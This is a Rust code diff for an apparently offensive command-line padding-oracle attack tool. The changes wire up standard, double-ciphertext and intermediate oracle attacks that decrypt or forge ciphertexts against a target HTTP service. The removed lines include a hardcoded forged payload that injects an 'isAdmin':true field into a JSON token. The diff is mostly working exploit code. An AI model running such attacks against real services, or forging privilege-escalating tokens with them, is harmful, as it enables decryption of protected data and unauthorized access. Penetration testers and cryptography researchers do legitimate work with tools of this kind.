@@ -1,5 +1,5 @@
 
-use std::time::Duration;
+use std::{io::{self, Write}, time::Duration};
 
 use clap::{Parser, ValueEnum};
 use futures::future::join_all;
@@ -7,7 +7,7 @@ use strum_macros::Display;
 use tokio::{sync::mpsc, time::sleep};
 
 use reqwest::{ Method};
-use crate::{crypt::{cradlehelpers::{ComputeCache, build_cradle, decrypt_intermediate_block}, detector::{Detector, IntermediateDetector}}, helper::{Config, Encoding, encode_ct}, oracle::{IntermediateOracle, Oracle}, print::fmt_bytes_custom, transport::HTTPTransport};
+use crate::{crypt::{cradlehelpers::{ComputeCache, build_cradle, decrypt_intermediate_block}, detector::{Detector, IntermediateDetector, SimpleDetector}}, helper::{Config, Encoding, decode_ct, encode_ct, parse_bad_chars}, oracle::{DoubleOracle, IntermediateOracle, Oracle, SingleOracle}, print::{fmt_bytes_custom, progress_bar}, transport::HTTPTransport};
 
 pub mod crypt;
 pub mod errors;
@@ -90,12 +90,18 @@ struct Args {
     #[arg(short, long)]
     iv: Option<String>,
 
-    #[arg(short, long, ignore_case = true, default_value_t = Attack::ALL, help = "the attack type to use, (single = standard attack) (double = double ciphertext attack) \n(inter = intermediate ciphertext attack, not implemented yet)")]
+    #[arg(short, long, ignore_case = true, default_value_t = Attack::ALL, help = "the attack type to use, (single = standard attack) (double = double ciphertext attack) \n(inter = intermediate ciphertext attack)")]
     attack: Attack,
 
     ///number of times to retry when no valid byte found
     #[arg(short, long, default_value_t = 5)]
     retry: usize,
+
+    ///known bad characters used for intermediate oracle. You don't need to list all invalid bytes for the attack to work, only a few are needed. 
+    ///The default configuration is best for JSON on Node, PHP, etc. The intermediate oracle doesn't work great for most Python apps at the moment.
+    ///add bad bytes like so '\x00\x01\x02"\xff}{[]!'
+    #[arg(long)]
+    bad_chars: Option<String>
 }
 
 #[tokio::main]
@@ -141,25 +147,102 @@ async fn main() {
         ));
         let standard_ct = standard_transport.base_ct.clone();
 
-        let detect = IntermediateDetector::init(&standard_ct, standard_transport, *block_size as usize, args.threads).await;
-        if let Ok(detector) = detect{
-            println!("Intermediate Oracle Detected");
-            let bad_chars = vec![ 0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08, 0x09, 0x0a, 0x0b, 0x0c, 0x0d, 0x0e, 0x0f, 0x10, 0x11,0x12, 0x13, 0x14, 0x15, 0x16, 0x17, 0x18, 0x19, 0x1a, 0x1b, 0x1c, 0x1d, 0x1e, 0x1f, 0x22];
-            //let bad_chars = vec![ 0xf5, 0xf6, 0xf7, 0xf8, 0xf9, 0xfa, 0xfb, 0xfc,0xfd,0xfe,0xff];
-            let (tx, rx) = mpsc::channel(255);
-            let intermediate_oracle = IntermediateOracle::new(detector, tx, *block_size as usize, &bad_chars);
-            //let pt = intermediate_oracle.decrypt(&standard_ct).await;
-            // if let Ok(pt) = pt{
-            //     println!("plaintext {:?}", fmt_bytes_custom(&pt));
-            // }
-            let ct = intermediate_oracle.forge(&standard_ct, "hello world!\",\"isAdmin\":true}".as_bytes()).await;
-            if let Ok(ct) = ct{
-                println!("{:?}",encode_ct(&ct, encoding.clone()));
+        // find ct_len for the progress bar
+        let mut ct_len = standard_ct.len() - *block_size as usize;
+        if let Some(ref pt) = args.forge {
+            ct_len = ((pt.len() / *block_size as usize) + 1) * *block_size as usize;
+        } else {
+            if let Some(ref ct_override) = args.ciphertext {
+                ct_len = decode_ct(ct_override.to_string(), encoding.clone()).len() - *block_size as usize;
             }
-            
-        }else{
-            println!("No Intermediate Oracle Detected");
+            if let Some(ref iv) = args.iv {
+                ct_len += decode_ct(iv.to_string(), encoding.clone()).len()
+            }
         }
+
+        if args.attack == Attack::ALL || args.attack == Attack::SINGLE{
+            let detect = SimpleDetector::init(None, &standard_ct, standard_transport.clone(), *block_size as usize, args.threads).await;
+            if let Ok(detector) = detect{
+                println!("Standard Oracle Detected");
+                let (tx, rx) = mpsc::channel(255);
+                let close_progress = progress_bar(ct_len, rx);
+                let oracle = SingleOracle::new(detector, tx, *block_size as usize, args.retry);
+                if let Some(ref pt) = args.forge{
+                    let ct = oracle.forge(&standard_ct, pt.as_bytes()).await;
+                    if let Ok(ct) = ct{
+                        close_progress();
+                        println!("ciphertext {:?}",encode_ct(&ct, encoding.clone()));
+                        return;
+                    }
+                }else{
+                    let pt = oracle.decrypt(&standard_ct).await;
+                    if let Ok(pt) = pt{
+                        close_progress();
+                        println!("plaintext {:?}", fmt_bytes_custom(&pt));
+                        return;
+                    }
+                }
+            }else{
+                println!("No Standard Oracle Detected");
+            }
+        }
+
+        if args.attack == Attack::ALL || args.attack == Attack::DOUBLE{
+            let detect = SimpleDetector::init(Some(standard_ct.clone()), &standard_ct, standard_transport.clone(), *block_size as usize, args.threads).await;
+            if let Ok(detector) = detect{
+                println!("Double Oracle Detected");
+                let (tx, rx) = mpsc::channel(255);
+                let close_progress = progress_bar(ct_len, rx);
+                let double_oracle = DoubleOracle::new(detector, tx, &standard_ct, *block_size as usize, args.retry);
+                if let Some(ref pt) = args.forge{
+                    let ct = double_oracle.forge(&standard_ct, pt.as_bytes()).await;
+                    if let Ok(ct) = ct{
+                        close_progress();
+                        println!("ciphertext {:?}",encode_ct(&ct, encoding.clone()));
+                        return;
+                    }
+                }else{
+                    let pt = double_oracle.decrypt(&standard_ct).await;
+                    if let Ok(pt) = pt{
+                        close_progress();
+                        println!("plaintext {:?}", fmt_bytes_custom(&pt));
+                        return;
+                    }
+                }
+            }else{
+                println!("No Double Oracle Detected");
+            }
+        }
+
+        if args.attack == Attack::ALL || args.attack == Attack::INTER{
+            let detect = IntermediateDetector::init(&standard_ct, standard_transport, *block_size as usize, args.threads).await;
+            if let Ok(detector) = detect{
+                println!("Intermediate Oracle Detected");
+                let bad_chars = parse_bad_chars(args.bad_chars);
+                let (tx, rx) = mpsc::channel(255);
+                let close_progress = progress_bar(ct_len, rx);
+                let intermediate_oracle = IntermediateOracle::new(detector, tx, *block_size as usize, &bad_chars);
+                if let Some(ref pt) = args.forge{
+                    let ct = intermediate_oracle.forge(&standard_ct, pt.as_bytes()).await;
+                    if let Ok(ct) = ct{
+                        close_progress();
+                        println!("ciphertext {:?}",encode_ct(&ct, encoding.clone()));
+                        return;
+                    }
+                }else{
+                    let pt = intermediate_oracle.decrypt(&standard_ct).await;
+                    if let Ok(pt) = pt{
+                        close_progress();
+                        println!("plaintext {:?}", fmt_bytes_custom(&pt));
+                        return;
+                    }
+                }
+            }else{
+                println!("No Intermediate Oracle Detected");
+            }
+
+        }
+        
         // let double_oracle = Box::new(HTTPDoubleOracle::new(
         //     args.url,
         //     headers,
